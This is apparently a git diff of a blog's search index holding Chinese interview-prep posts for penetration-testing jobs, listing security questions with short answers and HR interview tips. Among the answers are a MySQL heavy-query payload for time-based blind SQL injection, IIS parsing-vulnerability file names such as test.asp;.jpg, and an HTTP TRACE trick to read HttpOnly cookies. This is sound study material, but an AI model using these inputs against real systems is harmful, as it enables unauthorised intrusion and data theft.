+<li>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns</li>
+<li>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a></li>
+<li>phpinfo上显示的信息</li>
+</ol>
+<h3 id="渗透的时候如何隐藏自己的身份"><a href="#渗透的时候如何隐藏自己的身份" class="headerlink" title="渗透的时候如何隐藏自己的身份"></a>渗透的时候如何隐藏自己的身份</h3><h3 id="主机疑似遭到入侵，要看哪里的日志"><a href="#主机疑似遭到入侵，要看哪里的日志" class="headerlink" title="主机疑似遭到入侵，要看哪里的日志"></a>主机疑似遭到入侵，要看哪里的日志</h3><h3 id="SQL注入漏洞怎么修复"><a href="#SQL注入漏洞怎么修复" class="headerlink" title="SQL注入漏洞怎么修复"></a>SQL注入漏洞怎么修复</h3><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><h3 id="安全研究的方面？做过哪些渗透测试的工作？"><a href="#安全研究的方面？做过哪些渗透测试的工作？" class="headerlink" title="安全研究的方面？做过哪些渗透测试的工作？"></a>安全研究的方面？做过哪些渗透测试的工作？</h3><h3 id="只给你一个网址，如何进行渗透测试"><a href="#只给你一个网址，如何进行渗透测试" class="headerlink" title="只给你一个网址，如何进行渗透测试"></a>只给你一个网址，如何进行渗透测试</h3><h3 id="SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"><a href="#SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？" class="headerlink" title="SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"></a>SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</h3><h3 id="sleep被禁用后还能怎么进行sql注入"><a href="#sleep被禁用后还能怎么进行sql注入" class="headerlink" title="sleep被禁用后还能怎么进行sql注入"></a>sleep被禁用后还能怎么进行sql注入</h3><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。<br>mysql：<code>AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</code></p>
+<h3 id="XSS可以控制属性怎么利用"><a href="#XSS可以控制属性怎么利用" class="headerlink" title="XSS可以控制属性怎么利用"></a>XSS可以控制属性怎么利用</h3><h3 id="CSRF怎么防护？"><a href="#CSRF怎么防护？" class="headerlink" title="CSRF怎么防护？"></a>CSRF怎么防护？</h3><p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p>
+<h3 id="请求头中哪些是有危害的？"><a href="#请求头中哪些是有危害的？" class="headerlink" title="请求头中哪些是有危害的？"></a>请求头中哪些是有危害的？</h3><p>Cookie</p>
+<h3 id="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过" class="headerlink" title="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"></a>XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</h3><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的</p>
+<p>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml</p>
+<p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p>
+<p>javax.xml.stream.XMLStreamReader;</p>
+<p>javax.xml.parsers.DocumentBuilderFactory;</p>
+<h3 id="JAVA中间件的漏洞，举几个例子？"><a href="#JAVA中间件的漏洞，举几个例子？" class="headerlink" title="JAVA中间件的漏洞，举几个例子？"></a>JAVA中间件的漏洞，举几个例子？</h3><p>常见的是反序列化漏洞</p>
+<h3 id="IIS常见的漏洞"><a href="#IIS常见的漏洞" class="headerlink" title="IIS常见的漏洞"></a>IIS常见的漏洞</h3><p>常见的为解析漏洞，6.0有<br>/test.asp/test.jpg<br>  test.asp;.jpg<br>  7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx<br>  原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p>
+<h3 id="python有哪些框架，其中出现过哪些漏洞"><a href="#python有哪些框架，其中出现过哪些漏洞" class="headerlink" title="python有哪些框架，其中出现过哪些漏洞"></a>python有哪些框架，其中出现过哪些漏洞</h3><p>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值<br>如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中html标签属性字段绕过xss过滤。</p>
+<p>Django出现过目录遍历漏洞</p>
+<h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？" class="headerlink" title="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"></a>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？" class="headerlink" title="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"></a>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p>
+<h2 id="盛邦"><a href="#盛邦" class="headerlink" title="盛邦"></a>盛邦</h2><h3 id="有没有做过协议分析和抓包分析"><a href="#有没有做过协议分析和抓包分析" class="headerlink" title="有没有做过协议分析和抓包分析"></a>有没有做过协议分析和抓包分析</h3><h2 id="翼果"><a href="#翼果" class="headerlink" title="翼果"></a>翼果</h2><h3 id="mysql查看版本？"><a href="#mysql查看版本？" class="headerlink" title="mysql查看版本？"></a>mysql查看版本？</h3><h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过"><a href="#编程能力-平台逆向-修改程序入口-rootkit有没有研究过" class="headerlink" title="编程能力/平台逆向/修改程序入口/rootkit有没有研究过"></a>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3>]]></content>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>个人准备渗透测试和安全面试的经验之谈（3）</title>
     <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%883%EF%BC%89/</url>
     <content><![CDATA[<blockquote>
@@ -3602,235 +3831,6 @@
       </tags>
   </entry>
   <entry>
-    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
-    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
-    <content><![CDATA[<blockquote>
-<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
-</blockquote><a id="more"></a>
-<ul>
-<li><a href="#hr面">HR面</a><ul>
-<li><a href="#问题">问题</a><ul>
-<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
-<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
-<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
-<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
-<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
-<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
-<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
-<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
-<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
-<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
-<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
-<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
-<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
-<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
-<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
-<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
-<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
-<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
-<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
-<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
-<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
-<ul>
-<li>安全概念和资讯</li>
-<li>安全工具使用</li>
-<li>渗透测试</li>
-<li>安全基线检查</li>
-<li>应急响应</li>
-<li>代码审计</li>
-<li>安全边界建设</li>
-<li>安全规范 </li>
-</ul>
-<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
-<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
-<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
-<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
-<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
-<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
-<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
-<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
-</ul>
-<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
-<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
-<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
-<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
-<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
-</ol>
-<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
-<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
-<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
-<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
-<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
-<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
-<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
-<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
-<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
-<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
-<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
-<li>试用期多久？薪水多少？</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人准备渗透测试和安全面试的经验之谈（2）</title>
-    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%882%EF%BC%89/</url>
-    <content><![CDATA[<blockquote>
-<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md</a></p>
-</blockquote><a id="more"></a>
-<ul>
-<li><a href="#面试问题记录">面试问题记录</a><ul>
-<li><a href="#360">360</a><ul>
-<li><a href="#sql的存储引擎">SQL的存储引擎</a></li>
-<li><a href="#sql注入写shell的条件用法">SQL注入写shell的条件，用法</a></li>
-<li><a href="#gpc是什么开启了怎么绕过">GPC是什么？开启了怎么绕过</a></li>
-<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
-<li><a href="#iis解析漏洞不同版本有什么漏洞还有什么容器解析漏洞">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</a></li>
-<li><a href="#wireshark抓包数据报经过三层交换机路由的变化nat协议描述地址进入内网怎么变化">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</a></li>
-<li><a href="#linux计划任务黑客隐藏自己的计划任务会怎么做windows计划任务怎么设定">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</a></li>
-<li><a href="#挖过最难的漏洞是什么">挖过最难的漏洞是什么</a></li>
-</ul>
-</li>
-<li><a href="#ukelink">ukelink</a><ul>
-<li><a href="#病毒和蠕虫的区别">病毒和蠕虫的区别</a></li>
-<li><a href="#dns欺骗是什么">DNS欺骗是什么</a></li>
-<li><a href="#DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</a></li>
-<li><a href="#陆地land攻击是什么">陆地land攻击是什么</a></li>
-<li><a href="#xss有什么执行存储型的xss的危害和原理">xss有什么？执行存储型的xss的危害和原理</a></li>
-<li><a href="#渗透测试流程不够清晰太浅显">渗透测试流程？（不够清晰，太浅显</a></li>
-<li><a href="#有没有移动端的调试经验-apkipa包分析">有没有移动端的调试经验 apk,ipa包分析</a></li>
-<li><a href="#对于云安全的理解">对于云安全的理解</a></li>
-<li><a href="#虚拟机逃逸的理解">虚拟机逃逸的理解</a></li>
-<li><a href="#英语介绍一下自己">英语介绍一下自己</a></li>
-<li><a href="#职业路径">职业路径</a></li>
-<li><a href="#大学做过什么相关的事情">大学做过什么相关的事情</a></li>
-<li><a href="#在工作会做什么来不断提高自己的能力">在工作会做什么来不断提高自己的能力</a></li>
-</ul>
-</li>
-<li><a href="#卓望">卓望</a><ul>
-<li><a href="#渗透测试流程">渗透测试流程</a></li>
-<li><a href="#描述渗透项目做了什么">描述渗透项目，做了什么</a></li>
-<li><a href="#xss漏洞类型详情修复方案">xss漏洞类型、详情、修复方案</a></li>
-<li><a href="#sql注入原理类型waf绕过写shell提权修复方案">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</a></li>
-<li><a href="#终端的渗透经验">终端的渗透经验</a></li>
-<li><a href="#了解什么比较新的漏洞">了解什么比较新的漏洞</a></li>
-<li><a href="#企业内部安全">企业内部安全</a></li>
-</ul>
-</li>
-<li><a href="#安巽">安巽</a><ul>
-<li><a href="#算法了解过什么排序">算法？了解过什么排序？</a></li>
-<li><a href="#爬虫">爬虫</a><ul>
-<li><a href="#页面存在很多js的时候用什么">页面存在很多js的时候，用什么</a></li>
-<li><a href="#爬虫的待爬取url量级比较大的时候如何对其去重">爬虫的待爬取URL量级比较大的时候，如何对其去重</a></li>
-<li><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么">多线程 异步 协程 多路复用 用哪一个最快 为什么</a></li>
-</ul>
-</li>
-<li><a href="#浏览器的常用编码">浏览器的常用编码</a></li>
-<li><a href="#web常用的加密算法有什么">web常用的加密算法有什么</a></li>
-<li><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</a></li>
-<li><a href="#mysql中like查询会会非常缓慢如何进行优化">mysql中like查询会会非常缓慢，如何进行优化</a></li>
-<li><a href="#做了cdn的网站如何获取真实ip">做了cdn的网站如何获取真实IP</a></li>
-<li><a href="#渗透的时候如何隐藏自己的身份">渗透的时候如何隐藏自己的身份</a></li>
-<li><a href="#主机疑似遭到入侵要看哪里的日志">主机疑似遭到入侵，要看哪里的日志</a></li>
-<li><a href="#sql注入漏洞怎么修复">SQL注入漏洞怎么修复</a></li>
-</ul>
-</li>
-<li><a href="#长亭">长亭</a><ul>
-<li><a href="#安全研究的方面做过哪些渗透测试的工作">安全研究的方面？做过哪些渗透测试的工作？</a></li>
-<li><a href="#只给你一个网址如何进行渗透测试">只给你一个网址，如何进行渗透测试</a></li>
-<li><a href="#SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？">SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？</a></li>
-<li><a href="#sleep被禁用后还能怎么进行sql注入">sleep被禁用后还能怎么进行sql注入</a></li>
-<li><a href="#xss可以控制属性怎么利用">XSS可以控制属性怎么利用</a></li>
-<li><a href="#csrf怎么防护">CSRF怎么防护？</a></li>
-<li><a href="#请求头中哪些是有危害的">请求头中哪些是有危害的？</a></li>
-<li><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</a></li>
-<li><a href="#java中间件的漏洞举几个例子">JAVA中间件的漏洞，举几个例子？</a></li>
-<li><a href="#iis常见的漏洞">IIS常见的漏洞</a></li>
-<li><a href="#python有哪些框架其中出现过哪些漏洞">python有哪些框架，其中出现过哪些漏洞</a></li>
-<li><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</a></li>
-<li><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</a></li>
-<li><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</a></li>
-</ul>
-</li>
-<li><a href="#盛邦">盛邦</a><ul>
-<li><a href="#有没有做过协议分析和抓包分析">有没有做过协议分析和抓包分析</a></li>
-</ul>
-</li>
-<li><a href="#翼果">翼果</a><ul>
-<li><a href="#mysql查看版本">mysql查看版本？</a></li>
-<li><a href="#过安全狗">过安全狗</a></li>
-<li><a href="#编程能力平台逆向修改程序入口rootkit有没有研究过">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="面试问题记录"><a href="#面试问题记录" class="headerlink" title="面试问题记录"></a>面试问题记录</h1><blockquote>
-<p>CONTACT ME: github.com/leezj9671</p>
-</blockquote>
-<h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><h3 id="SQL的存储引擎"><a href="#SQL的存储引擎" class="headerlink" title="SQL的存储引擎"></a>SQL的存储引擎</h3><h3 id="SQL注入写shell的条件，用法"><a href="#SQL注入写shell的条件，用法" class="headerlink" title="SQL注入写shell的条件，用法"></a>SQL注入写shell的条件，用法</h3><h3 id="GPC是什么？开启了怎么绕过"><a href="#GPC是什么？开启了怎么绕过" class="headerlink" title="GPC是什么？开启了怎么绕过"></a>GPC是什么？开启了怎么绕过</h3><h3 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h3><h3 id="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"><a href="#IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞" class="headerlink" title="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"></a>IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</h3><h3 id="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"><a href="#wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化" class="headerlink" title="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"></a>wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</h3><h3 id="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"><a href="#linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定" class="headerlink" title="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"></a>linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</h3><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p>
-<h3 id="挖过最难的漏洞是什么"><a href="#挖过最难的漏洞是什么" class="headerlink" title="挖过最难的漏洞是什么"></a>挖过最难的漏洞是什么</h3><h2 id="ukelink"><a href="#ukelink" class="headerlink" title="ukelink"></a>ukelink</h2><h3 id="病毒和蠕虫的区别"><a href="#病毒和蠕虫的区别" class="headerlink" title="病毒和蠕虫的区别"></a>病毒和蠕虫的区别</h3><h3 id="DNS欺骗是什么"><a href="#DNS欺骗是什么" class="headerlink" title="DNS欺骗是什么"></a>DNS欺骗是什么</h3><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
